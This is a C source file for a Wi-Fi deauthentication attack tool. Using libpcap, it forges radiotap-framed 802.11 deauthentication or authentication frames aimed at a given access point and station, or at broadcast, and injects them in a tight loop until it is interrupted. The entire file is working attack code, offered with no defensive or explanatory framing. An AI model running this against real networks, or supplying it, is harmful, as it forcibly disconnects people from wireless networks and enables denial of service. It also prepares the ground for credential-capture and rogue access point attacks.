#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap/pcap.h>

#define AT_NONE       0x00
#define AT_BYAUTH     0x01
#define AT_USESTATION 0x02

#define RT_MAC_OFS         0x0C
#define RT_MAC_RX          0x00
#define RT_MAC_TX          0x01
#define RT_MAC_BSS         0x02
#define DEAUTH_UNSPECIFIED 0x01, 0x00

#define MAC_BROADCAST 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF

const char broadcast[] = { MAC_BROADCAST };

char deauth[] = {
    0x00, 0x00, 0x08, 0x00,
    0x00, 0x00, 0x00, 0x00,

    0xc0, 0x00,
    0x3c, 0x00,

    MAC_BROADCAST, /* Rx  */
    MAC_BROADCAST, /* Tx  */
    MAC_BROADCAST, /* BSS */

    0x20, 0xa6,
    DEAUTH_UNSPECIFIED /* RC */
};

char auth[] = {
    0x00, 0x00, 0x08, 0x00,
    0x00, 0x00, 0x00, 0x00,

    0xb0, 0x00,
    0x3c, 0x00,

    MAC_BROADCAST, /* Rx  */
    MAC_BROADCAST, /* Tx  */
    MAC_BROADCAST, /* BSS */

    0x40, 0xa6,

    0x00, 0x00,
    0x01, 0x00,
    0x00, 0x00
};

typedef unsigned char mac_t[6];
typedef unsigned char* __restrict mac_restrict_t;

void readmac(const char* src, mac_t dst)
{
    sscanf(
        src,
        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        dst + 0, dst + 1, dst + 2,
        dst + 3, dst + 4, dst + 5
    );
}

void printmac(mac_t dst)
{
    printf(
        "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
        dst[0], dst[1], dst[2],
        dst[3], dst[4], dst[5]
    );
}

void writemac(
    void* __restrict dst,
    const mac_restrict_t src,
    const size_t i)
{
    memcpy(dst + RT_MAC_OFS + 6 * i, src, 6);
}

inject(
    pcap_t*              dev,
    void*                base,
    const size_t         len,
    const mac_restrict_t rx,
    const mac_restrict_t tx,
    const mac_restrict_t bss)
{
    writemac(base, rx, RT_MAC_RX);
    writemac(base, tx, RT_MAC_TX);
    writemac(base, bss, RT_MAC_BSS);

    return pcap_inject(dev, base, len);
}

attack(
    pcap_t*              dev,
    const unsigned char  mode,
    const mac_restrict_t ap,
    const mac_restrict_t station)
{
    char* base              = mode & AT_BYAUTH ? auth : deauth;
    const size_t len        = mode & AT_BYAUTH ? sizeof auth : sizeof deauth;
    const mac_restrict_t rx = mode & AT_USESTATION ? station : broadcast;

    if (inject(dev, base, len, rx, ap, ap) < 0)
        goto ERROR;

    if (mode & AT_USESTATION &&
        inject(dev, base, len, ap, rx, ap) < 0)
        goto ERROR;

    return 0;
ERROR:
    fprintf(stderr, "pcap_inject(): %s\n", pcap_geterr(dev));
    return -1;
}


static jmp_buf ehf;

void sigint(int __attribute__((unused)) _)
{
    longjmp(ehf, 1);
}


main(
    const int   argc,
    const char* argv[])
{
    pcap_t*       dev;
    mac_t         ap, station;
    unsigned char mode;
    char          err[PCAP_BUF_SIZE];

    mode = AT_NONE;


    dev = pcap_open_live(argv[1], BUFSIZ, 1, 1, err);
    if (!dev)
    {
        fprintf(stderr, "pcap_open_live(): %s\n", err);
        goto EXIT;
    }

    readmac(argv[2], ap);

    if (argc >= 4)
    {
        readmac(argv[3], station);
        mode |= AT_USESTATION;
    }

    if (argc >= 5 && strcmp(argv[4], "-auth"))
        mode |= AT_BYAUTH;


    if (setjmp(ehf))
        goto EXIT;
    __sysv_signal(SIGABRT, sigint);
    __sysv_signal(SIGKILL, sigint);
    __sysv_signal(SIGINT, sigint);

    for (; !attack(dev, mode, ap, station); usleep(1000))
    {
    }


EXIT:
    if (dev)
        pcap_close(dev);
    return 0;
}
